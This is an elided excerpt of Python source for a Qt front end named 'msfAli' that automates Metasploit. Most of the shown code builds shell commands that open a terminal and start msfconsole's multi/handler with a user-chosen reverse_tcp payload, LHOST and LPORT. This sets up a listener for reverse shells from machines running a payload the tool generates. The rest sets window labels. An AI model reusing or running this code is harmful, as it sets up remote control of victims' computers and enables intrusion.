try:
	...
	class Application0():
		def Application00(self):
			...
			self.window.setWindowTitle("msfAli")
			#####################################################{Line Edit}
			#host
						...
						if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
							...
							if runmetasploit == QMessageBox.Yes:
								...
								if terminal == 0:
									...
									os.system("xterm -title msfAli -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
						else:
						...
						if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
							...
							if runmetasploit == QMessageBox.Yes:
								...
								if terminal == 0:
									...
									os.system("xterm -title msfAli -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/x86/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
						else:
							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
				###########################################################################################################################################################################################################################################################################################
						...
						if self.payload.currentText() == "shell":
							...
							if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
								...
								if runmetasploit == QMessageBox.Yes:
									terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
									if terminal == 0:
										os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"_reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
									elif terminal == 1:
										os.system("xterm -title msfAli -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"_reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
							else:
								error_save = QMessageBox.about(self.window,"ERROR","ERROR")
	...
	#############################################################################################################################################################################
			...
			#name youtube
			self.youtube = QLabel(self.window,text="")
			self.youtube.move(50 ,5)
			#name instagram
			self.instagram = QLabel(self.window,text="Instagram: @alipasha_trn")
			self.instagram.move(4 ,283)
			# name version
			self.version = QLabel(self.window,text="")
